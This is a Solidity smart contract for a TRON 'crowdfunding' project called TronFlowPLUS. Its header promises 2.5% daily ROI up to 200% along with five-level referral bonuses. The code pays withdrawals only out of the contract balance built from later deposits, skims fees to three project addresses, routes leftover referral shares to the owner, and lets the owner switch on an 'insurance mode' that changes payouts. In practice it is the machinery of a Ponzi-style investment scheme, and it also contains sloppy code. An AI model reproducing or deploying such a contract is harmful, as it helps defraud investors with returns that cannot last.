//SourceUnit: contrato.sol

pragma solidity ^0.4.25;
/*

------------------------------------
Crowdfunding & Crowdsharing project
 Website :  https://tronflowplus.net  
 Chanel :  https://t.me/tronflowplus_official
------------------------------------ 
 CONTRACT MANAGEMENT:
------------------------------------
2,5% daily ROI until 200% of your active capital
4% direct referral 👨  
3% referred level 2 👨🏽‍👨🏽‍  
1% referred level 3 👨🏽‍👨🏽‍👨🏽‍  
1% referred level 4 👨🏽‍👨🏽‍ 👨🏽‍ 👨🏽‍   
1% referred level 5 👨🏽‍👨🏽‍ 👨🏽‍👨🏽‍ 👨🏽‍    
------------------------------------
Reinvest to generate compound interest
------------------------------------
*/


contract TronFlowPLUS {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public totalReinvest;
    uint public activedeposits;
    uint private minDepositSize = 1000000000; //1000trx
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private minuteRate = 290000; //2,5% ROI
    uint private prelaunchTime =  1611878400;  
    uint private releaseTime = 1612551600;  //5 february, 19pm UTC 
    
    
    
    uint public insurancemode = 0;
    uint256 public insurancedep;
    uint256 cycle = 0;
   
    
    address private feed1;
    address private feed2;
    address private feed3;
    address private insurance;
    address owner;
    

    
    struct Player {
        uint trxDeposit;
       
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256  playerdeposit;
        uint256  playerreinvest;
        uint256 withdrawtime;
    

        
    }
    
    
        uint256 public last5;
        address public last5ad;
        uint256 public last4;
        address public last4ad;
        uint256 public last3;
        address public last3ad;
        uint256 public last2;
        address public last2ad;
        uint256 public last1;
        address public last1ad;
        
    
       
         uint256 public top5;
        address public top5ad;
        uint256 public top4;
        address public top4ad;
        uint256 public top3;
        address public top3ad;
        uint256 public top2;
        address public top2ad;
        uint256 public top1;
        address public top1ad;
        
        uint256 public lasttop5;
        address public lasttop5ad;
        uint256 public lasttop4;
        address public lasttop4ad;
        uint256 public lasttop3;
        address public lasttop3ad;
        uint256 public lasttop2;
        address public lasttop2ad;
        uint256 public lasttop1;
        address public lasttop1ad;

        

     

    mapping(address => Player) public players;
    
    
    
    event Newbie(address indexed user, address indexed _referrer, uint _time);  
	event NewDeposit(address indexed user, uint256 amount, uint _time);  
	event Withdrawn(address indexed user, uint256 amount, uint _time);  
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
	event Reinvest(address indexed user, uint256 amount, uint _time); 


    constructor(address _marketingAddr, address _projectAddr, address _leaderAddr, address _insurance) public {

		feed1 = _projectAddr;
		feed2 = _marketingAddr;
		feed3 = _leaderAddr;
		owner = msg.sender;
		insurance = _insurance;
	}


   


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
      players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
      
      
     
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
    
        checkcycle();
        if (now >= releaseTime){
            
        collect(msg.sender);
        
        }
        require(msg.value >= minDepositSize, "not minimum amount!");


        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];
        

        if (player.time == 0) {
            
            if (now < releaseTime) {
               player.time = releaseTime; 
                
            }
            else{
               
               player.time = now; 
            }    
                
            
            
            
            totalPlayers++;
            player.withdrawtime =now + 7 days;
         
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
                 emit Newbie(msg.sender, _affAddr, now);
              register(msg.sender, _affAddr);
            }
            else{
                emit Newbie(msg.sender, owner, now);
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        player.playerdeposit = player.playerdeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);  

        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount);
        emit NewDeposit(msg.sender, depositAmount, now); 
        uint feedEarn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
         uint feedtrx1 = feedEarn.div(8);
        uint feedtrx2 = feedtrx1 +feedEarn.div(4);
        uint feedtrx3 = feedEarn.div(2);
         feed1.transfer(feedtrx1);
        feed2.transfer(feedtrx2);
        feed3.transfer(feedtrx3);
        
        
        getlast5(msg.value,msg.sender);
    }

    function withdraw() public {
        
        Player storage player = players[msg.sender];
        checkcycle();
      
      if (now > player.withdrawtime){
        collect(msg.sender);
        
        require(players[msg.sender].interestProfit > 0);

        
        transferPayout(msg.sender, players[msg.sender].interestProfit);
        
      }
        
    }

    function reinvest() public {
      checkcycle();
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount/2);
      player.playerreinvest = player.playerreinvest.add(depositAmount);

      totalReinvest = totalReinvest.add(depositAmount);
      activedeposits = activedeposits.add(depositAmount/2);
      emit Reinvest(msg.sender, depositAmount, now);
      distributeRef(depositAmount, player.affFrom);

      uint feedEarn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
      uint feedtrx1 = feedEarn.mul(3).div(8);
      uint feedtrx2 = feedEarn.mul(5).div(8);
      feed1.transfer(feedtrx1);
      feed2.transfer(feedtrx2);
      
      
        
        
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
    	
	
        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            if (player.interestProfit >= player.trxDeposit.mul(2)){
                player.interestProfit = player.trxDeposit.mul(2);
            }
            
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
          uint payout;
            if (contractBalance > 0) {
                Player storage player = players[_receiver];
                if (insurancemode == 0){
                payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout/2);
                activedeposits = activedeposits.add(payout.mul(2).div(10));

                
                player.payoutSum = player.payoutSum.add((payout * 7) / 10);
                player.interestProfit = player.interestProfit.sub(payout);
                player.trxDeposit = player.trxDeposit.sub(payout/2);
                player.trxDeposit = player.trxDeposit.add(payout.mul(2).div(10));
 
                msg.sender.transfer(payout.mul(7).div(10));
                insurance.transfer(payout.mul(1).div(10));
                
                player.withdrawtime = now + 7 days;
                emit Withdrawn(msg.sender, payout, now);
     
             
              
              }else {
                  
                  uint256 loss = player.playerdeposit - (player.payoutSum);
                  if (loss > 0){
                  payout = loss > contractBalance ? contractBalance : loss;
                  totalPayout = totalPayout.add(payout);
                  player.payoutSum = player.payoutSum.add(payout);
                  msg.sender.transfer(payout);
                  player.withdrawtime = now + 7 days;
                  emit Withdrawn(msg.sender, payout, now);
                  }
                  
              }
                
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
       

        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(4)).div(100);
            _allaff = _allaff.sub(_affRewards);
           
           if (now > releaseTime) {
               collect(_affAddr1);
                
            }

            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            players[_affAddr1].trxDeposit = _affRewards.add(players[_affAddr1].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr1, msg.sender, 1, _affRewards, now);
    
          
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr2);
                
            }
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            players[_affAddr2].trxDeposit = _affRewards.add(players[_affAddr2].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr2, msg.sender, 2, _affRewards, now);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr3);
                
            }
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            players[_affAddr3].trxDeposit = _affRewards.add(players[_affAddr3].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr3, msg.sender, 3, _affRewards, now);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr4);
                
            }
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            players[_affAddr4].trxDeposit = _affRewards.add(players[_affAddr4].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr4, msg.sender, 4, _affRewards, now);
        }
        
       if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr5);
                
            }
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            players[_affAddr5].trxDeposit = _affRewards.add(players[_affAddr5].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr5, msg.sender, 5, _affRewards, now);
        }

        

        if(_allaff > 0 ){
       
            _affRewards = _allaff;
            if (now > releaseTime) {
               collect(owner);
                
            }
            players[owner].affRewards = _affRewards.add(players[owner].affRewards);
            players[owner].trxDeposit = _affRewards.add(players[owner].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

        if ( now < releaseTime){
        return 0;
            
            
        }
        else{


      uint secPassed = now.sub(player.time);
      
	  
	  
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      
      if (collectProfit.add(player.interestProfit) >= player.trxDeposit.mul(2)){
               return player.trxDeposit.mul(2);
            }
        else{
      return collectProfit.add(player.interestProfit);
        }
        }
    }
    
    function depositInsurance() public payable{
        require(msg.sender==owner && insurancemode == 1);
        
        insurancedep = insurancedep.add(msg.value);
        
    }
    
    
    
    
     


        function getlast5(uint256 _trx, address _sender) private {
           
        last5 = last4;
        last5ad = last4ad;
        last4 = last3;
        last4ad = last3ad;
        last3 = last2;
        last3ad = last2ad;
        last2 = last1;
        last2ad = last1ad;
        last1 = _trx;
        last1ad = _sender;
           
           if (_trx > top5){
               gettop5(_trx,_sender);
           }
            
        }
        
        function gettop5(uint256 _trx, address _sender) private  {
            
      if (_trx > top1){
          
          top5 = top4;
          top5ad = top4ad;
          top4 = top3;
          top4ad = top3ad;
          top3 = top2;
          top3ad = top2ad;
          top2 = top1;
          top2ad = top1ad;
          top1 = _trx;
          top1ad =_sender;
          
      }else if (_trx > top2){
          
          top5 = top4;
          top5ad = top4ad;
          top4 = top3;
          top4ad = top3ad;
          top3 = top2;
          top3ad = top2ad;
          top2 = _trx;
          top2ad = _sender;
          
          
      }else if (_trx > top3){
          top5 = top4;
          top5ad = top4ad;
          top4 = top3;
          top4ad = top3ad;
          top3 = _trx;
          top3ad = _sender;
          
          
      }else if (_trx > top4){
          
          top5 = top4;
          top5ad = top4ad;
          top4 = _trx;
          top4ad= _sender;
          
      }else{
          top5 = _trx;
          top5ad = _sender;
      }
      
      
      

            
        }
        
        
        
        function insurance_mode() public  {
         require(msg.sender==owner);
         
         if (address(this).balance < 10000000000){  //will be manually activated, and only if balance < 10ktrx
             insurancemode = 1;
             
         }
         
        }
        
        
        
        
        
        function checkcycle() private{
            
            uint256 check = (now - prelaunchTime)/ 1 days;
            if (check > cycle){
                cycle = check;
                
                
                lasttop5 = top5;
                lasttop5ad = top5ad;
                lasttop4 = top4;
                lasttop4ad = top4ad;
                lasttop3 = top3;
                lasttop3ad = top3ad;
                lasttop2 = top2;
                lasttop2ad = top2ad;
                lasttop1 = top1;
                lasttop1ad = top1ad;
                
                
                top5 = 0;
                top4 = 0;
                top3 = 0;
                top2 = 0;
                top1 = 0;
                
                

        
            }
        }
        
     
    
    
     
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}